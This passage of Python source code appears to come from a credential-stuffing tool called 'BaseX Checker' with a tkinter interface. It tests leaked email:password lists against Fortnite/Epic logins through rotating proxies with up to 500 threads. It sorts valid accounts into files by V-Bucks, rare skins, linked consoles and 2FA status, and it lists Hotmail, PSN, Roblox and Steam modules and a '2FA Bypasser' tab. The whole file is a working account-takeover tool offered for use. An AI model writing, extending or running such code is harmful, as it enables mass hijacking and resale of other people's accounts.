        tj = _fn_token_from_exchange(s, code)
        if not tj:
            return {"status": "BAD"}

        access_token = tj.get("access_token", "")
        account_id   = tj.get("account_id",   "")
        display_name = tj.get("displayName",  "")
        if not access_token:
            return {"status": "BAD"}

        data    = _fn_capture(s, account_id, access_token, display_name)
        is_free = (int(data.get("skins_count", 0) or 0) == 0
                   and int(data.get("vbucks", 0) or 0) == 0)
        return {"status": "FREE" if is_free else "FULL", "data": data}

    except requests.exceptions.Timeout:
        return {"status": "ERROR"}
    except requests.exceptions.ProxyError:
        return {"status": "ERROR"}
    except Exception as e:
        return {"status": "ERROR", "msg": str(e)[:80]}


def _fn_single_check(email, password, proxy=None, provider="both"):
    """Dual-provider checker: xbox first, epic web as fallback.
    provider: 'xbox' | 'epic' | 'both'
    Returns dict {status, data, provider_used}."""
    s = requests.Session()
    s.verify = False
    if proxy:
        s.proxies = {"http": proxy, "https": proxy}

    if provider == "xbox":
        res = _fn_check_xbox(email, password, s)
        res["provider_used"] = "xbox"
        return res

    if provider == "epic":
        res = _fn_check_epic_web(email, password, s)
        res["provider_used"] = "epic"
        return res

    # both — xbox first, fall back to epic web on failure
    res = _fn_check_xbox(email, password, s)
    if res.get("status") not in ("BAD", "ERROR"):
        res["provider_used"] = "xbox"
        return res

    res2 = _fn_check_epic_web(email, password, s)
    res2["provider_used"] = "epic"
    return res2

def _fn_worker(combo, proxies, writer, cb):
    try:
        parts = combo.strip().split(":", 1)
        if len(parts) < 2:
            cb("bad", combo, "bad format")
            return
        email, pw = parts[0].strip(), parts[1].strip()
        res    = _fn_single_check(email, pw, pick_proxy(proxies), provider="both")
        status = res.get("status", "ERROR")
        data   = res.get("data") or {}

        if status == "FULL":
            vbucks  = data.get("vbucks", 0) or 0
            skins   = data.get("skins_count", 0) or 0
            level   = data.get("level", 0) or 0
            bp      = "YES" if data.get("battle_pass") else "NO"
            stw     = "YES" if data.get("has_stw")     else "NO"
            psn     = "YES" if data.get("has_psn")     else "NO"
            xbl     = "YES" if data.get("has_xbox")    else "NO"
            nin     = "YES" if data.get("has_nintendo") else "NO"
            steam   = "YES" if data.get("has_steam")   else "NO"
            verified = data.get("email_verified", "?")
            og      = ", ".join(data.get("og_skins",   []))
            rare    = ", ".join(data.get("rare_skins", []))
            country = data.get("country", "?")
            name    = data.get("display_name", "?")
            wins    = data.get("wins", 0)  or 0
            kills   = data.get("kills", 0) or 0
            prov    = res.get("provider_used", "xbox")

            line = (
                f"{email}:{pw}"
                f" | Name:{name}"
                f" | VBucks:{vbucks}"
                f" | Level:{level}"
                f" | BP:{bp}"
                f" | Skins:{skins}"
                f" | STW:{stw}"
                f" | PSN:{psn}"
                f" | Xbox:{xbl}"
                f" | NIN:{nin}"
                f" | Steam:{steam}"
                f" | Verified:{verified}"
                f" | Country:{country}"
                f" | Wins:{wins} Kills:{kills}"
                f" | via:{prov}"
                + (f" | OG:{og}"   if og   else "")
                + (f" | Rare:{rare}" if rare else "")
            )
            writer.save("Fortnite_Full.txt", line)

            # skin-tier buckets
            if   skins >= 300: writer.save("Fortnite_300Plus.txt",  line)
            elif skins >= 100: writer.save("Fortnite_100Plus.txt",  line)
            elif skins >= 10:  writer.save("Fortnite_10Plus.txt",   line)
            if og:             writer.save("Fortnite_OG.txt",       line)
            if rare:           writer.save("Fortnite_Rare.txt",     line)
            if vbucks > 0:     writer.save("Fortnite_VBucks.txt",   line)
            if stw == "YES":   writer.save("Fortnite_STW.txt",      line)

            info = (f"V:{vbucks} | Sk:{skins} | Lv:{level} | BP:{bp}"
                    f" | STW:{stw} | {country}")
            if og:   info += f" | OG:{og}"
            if rare: info += f" | Rare:{rare}"
            cb("hit", email, info)

        elif status == "FREE":
            name = data.get("display_name", "?")
            writer.save("Fortnite_Free.txt",
                        f"{email}:{pw} | Free | Name:{name}")
            cb("hit", email, f"Free account | Name:{name}")

        elif status == "2FA":
            writer.save("Fortnite_2FA.txt", f"{email}:{pw}")
            cb("2fa", email, "2FA required")

        elif status == "NO_EPIC":
            writer.save("Fortnite_NoEpic.txt", f"{email}:{pw}")
            cb("bad", email, "No Epic account linked")

        elif status == "BANNED":
            writer.save("Fortnite_Banned.txt", f"{email}:{pw}")
            cb("bad", email, "Account banned")

        else:
            cb("bad", email, res.get("msg", status))

    except Exception as e:
        cb("err", combo[:30] if combo else "?", str(e)[:80])

def run_fortnite_bg(combo_file, proxy_file, threads, writer, cb_log, cb_stat, cb_done):
    pairs = []
    if combo_file and os.path.exists(combo_file):
        with open(combo_file, "r", errors="ignore") as f:
            for l in f:
                l = l.strip()
                if ":" in l and not l.startswith("#"):
                    pairs.append(l)
    proxies = load_proxies(proxy_file)
    if not pairs: cb_done("No combos found."); return
    stats = {"hit":0,"2fa":0,"bad":0,"err":0,"done":0}
    lk = Lock()
    def cb(kind, email, info):
        with lk:
            stats[kind if kind in stats else "err"] += 1
            stats["done"] += 1
        cb_log(kind, email, info)
        cb_stat(dict(stats), len(pairs))
    with ThreadPoolExecutor(max_workers=threads) as ex:
        futs = [ex.submit(_fn_worker, c, proxies, writer, cb) for c in pairs]
        for _ in as_completed(futs): pass
    cb_done(f"Done — {stats['hit']} hits | {stats['2fa']} 2FA | {stats['bad']} bad")

# ═══════════════════════════════════════════════════════════════════════════════
MODULE_RUNNERS = {
    'hotmail':  run_hotmail_bg,
    'xbox':     run_xbox_bg,
    'psn':      run_psn_bg,
    'roblox':   run_roblox_bg,
    'steam':    run_steam_bg,
    'fortnite': run_fortnite_bg,
}

class BaseXApp(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title('BaseX Checker v4.0')
        self.configure(bg=C['bg'])
        self.geometry('1100x680')
        self.minsize(900, 580)
        self._current_module = None
        self._running = False
        self._build_ui()

    # ── layout ──────────────────────────────────────────────────────────────
    def _build_ui(self):
        # sidebar
        sb = tk.Frame(self, bg=C['sidebar'], width=200)
        sb.pack(side='left', fill='y')
        sb.pack_propagate(False)

        # logo row
        logo_f = tk.Frame(sb, bg=C['sidebar'])
        logo_f.pack(fill='x', padx=16, pady=(20,10))
        tk.Label(logo_f, text='❄', font=('Segoe UI', 22), bg=C['sidebar'], fg=C['accent']).pack(side='left')
        lbl_f = tk.Frame(logo_f, bg=C['sidebar'])
        lbl_f.pack(side='left', padx=8)
        tk.Label(lbl_f, text='BASEX', font=('Segoe UI', 12, 'bold'), bg=C['sidebar'], fg=C['text']).pack(anchor='w')
        tk.Label(lbl_f, text='CHECKER', font=('Segoe UI', 7), bg=C['sidebar'], fg=C['muted']).pack(anchor='w')

        sep = tk.Frame(sb, bg=C['border'], height=1)
        sep.pack(fill='x', padx=12, pady=8)

        # nav
        self._nav_btns = {}
        for nav_id, nav_lbl, nav_icon in [('home','Home','⌂'),('discord','Discord','◈'),('settings','Settings','⚙')]:
            btn = self._nav_btn(sb, nav_id, nav_lbl, nav_icon)
            self._nav_btns[nav_id] = btn

        tk.Frame(sb, bg=C['sidebar']).pack(expand=True, fill='y')

        # licensed tag
        tag_f = tk.Frame(sb, bg=C['tag_bg'], padx=6, pady=3)
        tag_f.pack(padx=14, pady=(0,16))
        tk.Label(tag_f, text='✓  Licensed', font=('Segoe UI', 8), bg=C['tag_bg'], fg=C['tag_fg']).pack()

        # main content
        self._main = tk.Frame(self, bg=C['bg'])
        self._main.pack(side='left', fill='both', expand=True)

        self._show_home()

    def _nav_btn(self, parent, nav_id, label, icon):
        fr = tk.Frame(parent, bg=C['sidebar'], cursor='hand2')
        fr.pack(fill='x', padx=8, pady=1)
        active = (nav_id == 'home')
        bg = C['head'] if active else C['sidebar']
        fr.configure(bg=bg)
        inner = tk.Frame(fr, bg=bg, padx=12, pady=8)
        inner.pack(fill='x')
        tk.Label(inner, text=icon, font=('Segoe UI', 13), bg=bg, fg=C['accent'] if active else C['muted']).pack(side='left')
        tk.Label(inner, text=label, font=('Segoe UI', 10, 'bold' if active else 'normal'),
                 bg=bg, fg=C['text'] if active else C['muted']).pack(side='left', padx=8)
        for w in [fr, inner] + inner.winfo_children():
            w.bind('<Button-1>', lambda e, n=nav_id: self._nav_click(n))
        return fr

    def _nav_click(self, nav_id):
        if nav_id == 'home': self._show_home()
        elif nav_id == 'discord': self._show_msg('Discord', 'Join the community server for updates and support.')
        elif nav_id == 'settings': self._show_settings()

    # ── home page ────────────────────────────────────────────────────────────
    def _show_home(self):
        for w in self._main.winfo_children(): w.destroy()

        # breadcrumb + version
        top = tk.Frame(self._main, bg=C['bg'])
        top.pack(fill='x', padx=24, pady=(16,0))
        tk.Label(top, text='BaseX Checker  ›  Home', font=('Segoe UI', 8), bg=C['bg'], fg=C['muted']).pack(side='left')
        tk.Label(top, text='v4.0.0', font=('Segoe UI', 8), bg=C['bg'], fg=C['muted']).pack(side='right')

        # title + tabs row
        mid = tk.Frame(self._main, bg=C['bg'])
        mid.pack(fill='x', padx=24, pady=(10,0))
        tk.Label(mid, text='BASEX CHECKER', font=('Courier', 20, 'bold'), bg=C['bg'], fg=C['text']).pack(side='left')

        tag = tk.Frame(mid, bg=C['tag_bg'], padx=8, pady=3)
        tag.pack(side='right', padx=4)
        tk.Label(tag, text='⏱  30 days left', font=('Segoe UI', 8), bg=C['tag_bg'], fg=C['tag_fg']).pack()

        # tab bar
        tab_f = tk.Frame(self._main, bg=C['bg'])
        tab_f.pack(fill='x', padx=24, pady=(10,0))
        tk.Label(tab_f, text='Modules', font=('Segoe UI', 9, 'bold'),
                 bg=C['accent'], fg='white', padx=14, pady=5).pack(side='left')
        lk_f = tk.Frame(tab_f, bg=C['head'], padx=12, pady=5)
        lk_f.pack(side='left', padx=4)
        tk.Label(lk_f, text='🔒  2FA Bypasser', font=('Segoe UI', 9), bg=C['head'], fg=C['muted']).pack()

        sep = tk.Frame(self._main, bg=C['border'], height=1)
        sep.pack(fill='x', padx=24, pady=(8,12))

        # module grid — 2 columns
        grid = tk.Frame(self._main, bg=C['bg'])
        grid.pack(fill='both', expand=True, padx=20, pady=(0,16))
        grid.columnconfigure(0, weight=1)
        grid.columnconfigure(1, weight=1)

        for i, mod in enumerate(MODULES):
            row, col = divmod(i, 2)
            self._module_card(grid, mod, row, col)

    def _module_card(self, parent, mod, row, col):
        outer = tk.Frame(parent, bg=C['border'], padx=1, pady=1)
        outer.grid(row=row, column=col, padx=6, pady=5, sticky='nsew')
        parent.rowconfigure(row, weight=1)

        inner = tk.Frame(outer, bg=C['card'], cursor='hand2', padx=14, pady=12)
        inner.pack(fill='both', expand=True)

        # icon circle
        icon_f = tk.Frame(inner, bg=mod['color'], width=42, height=42)
        icon_f.pack(side='left')
        icon_f.pack_propagate(False)
        tk.Label(icon_f, text=mod['icon'], font=('Segoe UI', 16), bg=mod['color'], fg='white').place(relx=.5, rely=.5, anchor='center')

        # text
        txt_f = tk.Frame(inner, bg=C['card'])
        txt_f.pack(side='left', padx=12)
        tk.Label(txt_f, text=mod['label'], font=('Segoe UI', 10, 'bold'), bg=C['card'], fg=C['text']).pack(anchor='w')
        tk.Label(txt_f, text=mod['sub'], font=('Segoe UI', 8), bg=C['card'], fg=C['muted']).pack(anchor='w')

        # hover + click
        def enter(e, w=inner): w.configure(bg=C['card_h']); [c.configure(bg=C['card_h']) for c in w.winfo_children() if isinstance(c, tk.Frame) and c != icon_f]
        def leave(e, w=inner): w.configure(bg=C['card']); [c.configure(bg=C['card']) for c in w.winfo_children() if isinstance(c, tk.Frame) and c != icon_f]
        for w in [inner, txt_f] + txt_f.winfo_children():
            w.bind('<Enter>', enter); w.bind('<Leave>', leave)
            w.bind('<Button-1>', lambda e, m=mod: self._open_module(m))

    # ── module runner page ───────────────────────────────────────────────────
    def _open_module(self, mod):
        if mod['id'] not in MODULE_RUNNERS:
            self._show_msg(mod['label'], 'Module coming soon.')
            return
        for w in self._main.winfo_children(): w.destroy()
        self._current_module = mod

        # breadcrumb
        top = tk.Frame(self._main, bg=C['bg'])
        top.pack(fill='x', padx=24, pady=(16,0))
        back = tk.Label(top, text='← Home', font=('Segoe UI', 8), bg=C['bg'], fg=C['accent'], cursor='hand2')
        back.pack(side='left')
        back.bind('<Button-1>', lambda e: self._show_home())
        tk.Label(top, text=f'  ›  {mod["label"]}', font=('Segoe UI', 8), bg=C['bg'], fg=C['muted']).pack(side='left')

        # title
        hdr = tk.Frame(self._main, bg=C['bg'])
        hdr.pack(fill='x', padx=24, pady=(10,4))
        icon_f = tk.Frame(hdr, bg=mod['color'], width=36, height=36)
        icon_f.pack(side='left'); icon_f.pack_propagate(False)
        tk.Label(icon_f, text=mod['icon'], font=('Segoe UI', 16), bg=mod['color'], fg='white').place(relx=.5, rely=.5, anchor='center')
        tk.Label(hdr, text=mod['label'], font=('Segoe UI', 14, 'bold'), bg=C['bg'], fg=C['text']).pack(side='left', padx=10)

        sep = tk.Frame(self._main, bg=C['border'], height=1)
        sep.pack(fill='x', padx=24, pady=(8,8))

        # config area
        cfg = tk.Frame(self._main, bg=C['bg'])
        cfg.pack(fill='x', padx=24)

        # combo row
        self._combo_var = tk.StringVar(value='acc.txt')
        self._proxy_var = tk.StringVar(value='')
        self._threads_var = tk.IntVar(value=50)

        self._cfg_row(cfg, 'Combo File', self._combo_var, self._browse_combo)
        self._cfg_row(cfg, 'Proxy File (optional)', self._proxy_var, self._browse_proxy)

        t_row = tk.Frame(cfg, bg=C['bg'])
        t_row.pack(fill='x', pady=3)
        tk.Label(t_row, text='Threads', font=('Segoe UI', 9), bg=C['bg'], fg=C['muted'], width=14, anchor='w').pack(side='left')
        tk.Spinbox(t_row, from_=1, to=500, textvariable=self._threads_var,
                   font=('Segoe UI', 9), bg=C['card'], fg=C['text'], buttonbackground=C['card'],
                   relief='flat', bd=0, insertbackground=C['text'], width=6).pack(side='left', padx=4)

        # keywords for hotmail
        self._kw_var = None
        if mod['id'] == 'hotmail':
            kw_row = tk.Frame(cfg, bg=C['bg'])
            kw_row.pack(fill='x', pady=3)
            tk.Label(kw_row, text='Keywords (comma)', font=('Segoe UI', 9), bg=C['bg'], fg=C['muted'], width=14, anchor='w').pack(side='left')
            self._kw_var = tk.StringVar(value='Steam,Netflix,PayPal,Amazon,Xbox')
            tk.Entry(kw_row, textvariable=self._kw_var, font=('Segoe UI', 9),
                     bg=C['card'], fg=C['text'], insertbackground=C['text'], relief='flat', bd=4).pack(side='left', fill='x', expand=True, padx=4)

        sep2 = tk.Frame(self._main, bg=C['border'], height=1)
        sep2.pack(fill='x', padx=24, pady=(10,0))

        # stats bar
        stats_f = tk.Frame(self._main, bg=C['head'])
        stats_f.pack(fill='x', padx=24, pady=(6,0))
        self._stat_labels = {}
        for key, label, color in [('hit','Hits',C['green']),('2fa','2FA',C['orange']),
                                   ('bad','Bad',C['red']),('err','Err',C['muted']),('done','Done',C['text'])]:
            sf = tk.Frame(stats_f, bg=C['head'], padx=12, pady=6)
            sf.pack(side='left')
            tk.Label(sf, text=label, font=('Segoe UI', 8), bg=C['head'], fg=C['muted']).pack()
            lbl = tk.Label(sf, text='0', font=('Segoe UI', 14, 'bold'), bg=C['head'], fg=color)
            lbl.pack()
            self._stat_labels[key] = lbl

        # progress
        self._prog_var = tk.DoubleVar(value=0)
        self._prog_lbl = tk.Label(self._main, text='0 / 0', font=('Segoe UI', 8), bg=C['bg'], fg=C['muted'])
        self._prog_lbl.pack(anchor='e', padx=24)
        prog = ttk.Progressbar(self._main, variable=self._prog_var, maximum=100)
        prog.pack(fill='x', padx=24, pady=(2,6))
        style = ttk.Style(); style.configure('TProgressbar', background=C['accent'], troughcolor=C['card'])

        # log
        log_f = tk.Frame(self._main, bg=C['bg'])
        log_f.pack(fill='both', expand=True, padx=24, pady=(0,10))
        self._log = scrolledtext.ScrolledText(log_f, font=('Consolas', 8), bg=C['card'],
                                              fg=C['text'], insertbackground=C['text'],
                                              relief='flat', bd=0, state='disabled', wrap='word')
        self._log.pack(fill='both', expand=True)
        self._log.tag_config('hit', foreground=C['green'])
        self._log.tag_config('2fa', foreground=C['orange'])
        self._log.tag_config('bad', foreground=C['red'])
        self._log.tag_config('err', foreground=C['muted'])
        self._log.tag_config('info', foreground=C['cyan'])

        # run / stop buttons
        btn_f = tk.Frame(self._main, bg=C['bg'])
        btn_f.pack(fill='x', padx=24, pady=(0,10))
        self._run_btn = tk.Button(btn_f, text='▶  Start', font=('Segoe UI', 10, 'bold'),
                                  bg=C['accent'], fg='white', activebackground=C['accent2'],
                                  relief='flat', padx=20, pady=8, cursor='hand2',
                                  command=self._start_run)
        self._run_btn.pack(side='left', padx=(0,8))
        self._stop_btn = tk.Button(btn_f, text='■  Stop', font=('Segoe UI', 10),
                                   bg=C['head'], fg=C['muted'], relief='flat', padx=20, pady=8,
                                   cursor='hand2', state='disabled', command=self._stop_run)
        self._stop_btn.pack(side='left')

    def _cfg_row(self, parent, label, var, cmd):
        row = tk.Frame(parent, bg=C['bg'])
        row.pack(fill='x', pady=3)
        tk.Label(row, text=label, font=('Segoe UI', 9), bg=C['bg'], fg=C['muted'], width=14, anchor='w').pack(side='left')
        ent = tk.Entry(row, textvariable=var, font=('Segoe UI', 9),
                       bg=C['card'], fg=C['text'], insertbackground=C['text'], relief='flat', bd=4)
        ent.pack(side='left', fill='x', expand=True, padx=4)
        tk.Button(row, text='Browse', font=('Segoe UI', 8), bg=C['head'], fg=C['text'],
                  relief='flat', padx=8, cursor='hand2', command=cmd).pack(side='left')

    def _browse_combo(self):
        p = filedialog.askopenfilename(filetypes=[('Text','*.txt'),('All','*.*')])
        if p: self._combo_var.set(p)

    def _browse_proxy(self):
        p = filedialog.askopenfilename(filetypes=[('Text','*.txt'),('All','*.*')])
        if p: self._proxy_var.set(p)

    # ── run control ──────────────────────────────────────────────────────────
    def _start_run(self):
        if self._running: return
        mod = self._current_module
        combo_file = self._combo_var.get().strip()
        proxy_file = self._proxy_var.get().strip() or None
        threads = max(1, min(500, self._threads_var.get()))
        runner = MODULE_RUNNERS.get(mod['id'])
        if not runner: return
        writer, sdir = make_writer(mod['label'].replace(' ','_'))
        self._running = True
        self._run_btn.configure(state='disabled')
        self._stop_btn.configure(state='normal')
        self._log_clear()
        self._log_write('info', f'Starting {mod["label"]} — results → {sdir}\n')
        kwargs = dict(combo_file=combo_file, proxy_file=proxy_file, threads=threads,
                      writer=writer, cb_log=self._cb_log, cb_stat=self._cb_stat, cb_done=self._cb_done)
        if mod['id'] == 'hotmail':
            kws = [k.strip() for k in (self._kw_var.get() if self._kw_var else '').split(',') if k.strip()]
            kwargs['keywords'] = kws or ['Steam','Netflix','PayPal']
        self._thread = threading.Thread(target=runner, kwargs=kwargs, daemon=True)
        self._thread.start()

    def _stop_run(self):
        self._running = False
        self._run_btn.configure(state='normal')
        self._stop_btn.configure(state='disabled')
        self._log_write('info', '\n[STOPPED by user]\n')

    def _cb_log(self, kind, email, info):
        tag = kind if kind in ('hit','2fa','bad','err') else 'info'
        prefix = {'hit':'[HIT]','2fa':'[2FA]','bad':'[BAD]','err':'[ERR]'}.get(kind,'[---]')
        self.after(0, lambda: self._log_write(tag, f'{prefix}  {email}  |  {info}\n'))

    def _cb_stat(self, stats, total):
        def _upd():
            for k, lbl in self._stat_labels.items():
                lbl.configure(text=str(stats.get(k, 0)))
            done = stats.get('done', 0)
            self._prog_var.set((done / total * 100) if total else 0)
            self._prog_lbl.configure(text=f'{done} / {total}')
        self.after(0, _upd)

    def _cb_done(self, msg):
        def _upd():
            self._running = False
            self._run_btn.configure(state='normal')
            self._stop_btn.configure(state='disabled')
            self._log_write('info', f'\n{msg}\n')
        self.after(0, _upd)

    def _log_write(self, tag, text):
        self._log.configure(state='normal')
        self._log.insert('end', text, tag)
        self._log.see('end')
        self._log.configure(state='disabled')

    def _log_clear(self):
        self._log.configure(state='normal')
        self._log.delete('1.0', 'end')
        self._log.configure(state='disabled')

    # ── misc pages ───────────────────────────────────────────────────────────
    def _show_msg(self, title, msg):
        for w in self._main.winfo_children(): w.destroy()
        tk.Label(self._main, text=title, font=('Segoe UI', 16, 'bold'), bg=C['bg'], fg=C['text']).pack(pady=40)
        tk.Label(self._main, text=msg, font=('Segoe UI', 10), bg=C['bg'], fg=C['muted']).pack()

    def _show_settings(self):
        for w in self._main.winfo_children(): w.destroy()
        top = tk.Frame(self._main, bg=C['bg'])
        top.pack(fill='x', padx=24, pady=(16,0))
        tk.Label(top, text='BaseX Checker  ›  Settings', font=('Segoe UI', 8), bg=C['bg'], fg=C['muted']).pack(side='left')
        sep = tk.Frame(self._main, bg=C['border'], height=1)
        sep.pack(fill='x', padx=24, pady=12)
        tk.Label(self._main, text='Settings', font=('Segoe UI', 14, 'bold'), bg=C['bg'], fg=C['text']).pack(padx=24, anchor='w')
        tk.Label(self._main, text='No configurable options in this version.',
                 font=('Segoe UI', 9), bg=C['bg'], fg=C['muted']).pack(padx=24, pady=6, anchor='w')

# ═══════════════════════════════════════════════════════════════════════════════
if __name__ == '__main__':
    app = BaseXApp()
    app.mainloop()
